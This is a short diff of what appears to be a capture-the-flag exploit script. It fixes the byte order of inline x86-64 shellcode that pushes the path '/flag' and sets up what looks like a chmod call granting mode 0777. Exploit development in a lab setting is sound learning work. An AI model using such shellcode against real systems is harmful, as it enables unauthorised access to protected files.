@@ -12,7 +12,7 @@ context.timeout = 3000000
 #    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);
 
 shellcode=f"""
-mov rax, 0x2f666c6167
+mov rax, 0x67616c662f
 push rax
 mov rdi, rsp
 mov rsi, {u32(b"0777")}
